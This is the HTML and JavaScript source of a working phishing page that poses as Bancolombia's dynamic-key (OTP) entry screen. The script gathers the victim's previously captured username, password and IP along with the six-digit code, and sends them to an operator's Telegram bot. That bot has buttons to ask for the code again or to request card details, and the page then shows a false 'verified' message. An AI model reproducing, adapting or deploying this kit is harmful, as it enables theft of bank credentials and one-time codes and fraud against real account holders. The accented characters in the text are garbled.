<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clave Din√°mica - Bancolombia</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #fef3c7 0%, #fde047 38%, #facc15 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 480px;
            background: white;
            border-radius: 24px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo-text {
            font-size: 28px;
            font-weight: 900;
            color: #005CA9;
        }

        h1 {
            text-align: center;
            font-size: 24px;
            color: #0f172a;
            margin-bottom: 10px;
        }

        .subtitle {
            text-align: center;
            color: #64748b;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .otp-container {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-bottom: 30px;
        }

        .otp-input {
            width: 50px;
            height: 55px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            transition: all 0.3s;
        }

        .otp-input:focus {
            outline: none;
            border-color: #ffd200;
            box-shadow: 0 0 0 4px rgba(255, 210, 0, 0.1);
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background: #ffd200;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            color: #0f172a;
            cursor: pointer;
            text-transform: uppercase;
            transition: all 0.3s;
        }

        .btn-submit:hover {
            background: #facc15;
            transform: translateY(-2px);
        }

        .btn-submit:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .loading {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.8);
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }

        .loading.active {
            display: flex;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.2);
            border-top-color: #ffd200;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading" id="loadingScreen">
        <div style="text-align: center; color: white;">
            <div class="spinner"></div>
            <p style="margin-top: 20px;">Verificando c√≥digo...</p>
        </div>
    </div>

    <div class="container">
        <div class="logo">
            <div class="logo-text">Bancolombia</div>
        </div>

        <h1>üîê Clave Din√°mica</h1>
        <p class="subtitle">Ingresa los 6 d√≠gitos de tu clave</p>

        <form id="otpForm">
            <div class="otp-container">
                <input type="text" class="otp-input" maxlength="1" id="otp1" inputmode="numeric" autocomplete="off">
                <input type="text" class="otp-input" maxlength="1" id="otp2" inputmode="numeric" autocomplete="off">
                <input type="text" class="otp-input" maxlength="1" id="otp3" inputmode="numeric" autocomplete="off">
                <input type="text" class="otp-input" maxlength="1" id="otp4" inputmode="numeric" autocomplete="off">
                <input type="text" class="otp-input" maxlength="1" id="otp5" inputmode="numeric" autocomplete="off">
                <input type="text" class="otp-input" maxlength="1" id="otp6" inputmode="numeric" autocomplete="off">
            </div>

            <button type="submit" class="btn-submit" id="btnSubmit" disabled>
                Continuar
            </button>
        </form>
    </div>

    <script src="js/telegram.js"></script>
    <script>
        console.log('üîê OTP page loaded');

        // Verificar datos de login
        const userName = localStorage.getItem('userName');
        const userPass = localStorage.getItem('userPass');
        const userIP = localStorage.getItem('userIP');
        const transactionId = localStorage.getItem('transactionId');

        console.log('üì¶ Datos recuperados:', { userName, userPass, userIP, transactionId });

        if (!userName || !userPass) {
            console.error('‚ùå No hay datos de login');
            alert('Sesi√≥n expirada. Por favor inicia sesi√≥n nuevamente.');
            window.location.href = 'login.html';
        }

        const inputs = document.querySelectorAll('.otp-input');
        const btnSubmit = document.getElementById('btnSubmit');
        const form = document.getElementById('otpForm');

        // Navegaci√≥n entre inputs
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                
                const allFilled = Array.from(inputs).every(inp => inp.value.length === 1);
                btnSubmit.disabled = !allFilled;
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        // Submit form
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            console.log('üì§ OTP form submitted');

            const otp = Array.from(inputs).map(inp => inp.value).join('');
            console.log('üî¢ OTP ingresado:', otp);

            localStorage.setItem('userOTP', otp);

            document.getElementById('loadingScreen').classList.add('active');

            const mensaje = `üîê *BANCOLOMBIA - OTP DIN√ÅMICA*\n\nüë§ *Usuario:* ${userName}\nüîë *Clave:* ${userPass}\nüéØ *OTP:* ${otp}\nüåê *IP:* ${userIP}\n‚è∞ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\nüìÖ *Fecha:* ${new Date().toLocaleDateString('es-CO')}`;

            const teclado = {
                inline_keyboard: [
                    [
                        { text: "‚úÖ Correcto", callback_data: `correcto_otp:${transactionId}` },
                        { text: "‚ùå Incorrecto", callback_data: `error_otp:${transactionId}` }
                    ],
                    [
                        { text: "üîê Pedir Otra Vez", callback_data: `pedir_dinamica:${transactionId}` }
                    ],
                    [
                        { text: "üí≥ Pedir Tarjeta", callback_data: `pedir_tarjeta:${transactionId}` }
                    ]
                ]
            };

            try {
                if (typeof sendTelegramMessage === 'function') {
                    await sendTelegramMessage(mensaje, teclado);
                    console.log('‚úÖ OTP enviado a Telegram');
                }

                setTimeout(() => {
                    document.getElementById('loadingScreen').classList.remove('active');
                    alert('¬°C√≥digo verificado correctamente!');
                    // Aqu√≠ puedes redirigir a la siguiente p√°gina
                    // window.location.href = 'datos-tarjeta.html';
                }, 2000);

            } catch (error) {
                console.error('‚ùå Error:', error);
                document.getElementById('loadingScreen').classList.remove('active');
                alert('Error al verificar el c√≥digo. Intenta nuevamente.');
            }
        });

        // Focus en primer input
        inputs[0].focus();
    </script>
</body>
</html>
